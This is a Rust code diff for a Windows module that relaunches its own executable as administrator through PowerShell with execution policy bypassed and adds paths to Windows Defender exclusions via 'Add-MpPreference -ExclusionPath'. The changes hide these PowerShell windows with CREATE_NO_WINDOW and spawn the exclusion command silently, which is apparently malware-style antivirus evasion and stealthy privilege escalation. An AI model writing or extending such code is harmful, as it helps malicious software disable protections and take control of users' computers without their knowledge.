@@ -1,6 +1,8 @@
 use std::ffi::OsStr;
 use std::mem;
 use std::os::windows::prelude::OsStrExt;
+use std::os::windows::process::CommandExt;
+use std::process::Stdio;
 use std::{
     io::Error,
     process::{Command, ExitStatus},
@@ -10,6 +12,7 @@ use winapi::shared::minwindef::DWORD;
 use winapi::um::processthreadsapi::OpenProcessToken;
 use winapi::um::securitybaseapi::GetTokenInformation;
 use winapi::um::synchapi::{OpenMutexW, CreateMutexW};
+use winapi::um::winbase::CREATE_NO_WINDOW;
 use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY, SYNCHRONIZE};
 use winreg::{enums::*, RegKey};
 
@@ -47,6 +50,7 @@ pub fn is_administrator() -> Result<bool, Error> {
 
 pub fn run_as_admin() -> ExitStatus {
     let status = Command::new("powershell")
+        .creation_flags(CREATE_NO_WINDOW)
         .args(&[
             "-ExecutionPolicy",
             "Bypass",
@@ -57,6 +61,7 @@ pub fn run_as_admin() -> ExitStatus {
                 std::env::current_exe().unwrap().to_str().unwrap()
             ),
         ])
+        .stdout(Stdio::piped())
         .status()
         .expect("Failed to execute command");
 
@@ -69,7 +74,9 @@ pub fn add_to_defender_exclusions(path: &str) -> () {
             "-Command",
             &format!("Add-MpPreference -ExclusionPath '{}'", path),
         ])
-        .output()
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(Stdio::piped())
+        .spawn()
         .expect("Failed to execute command.");
 }
 
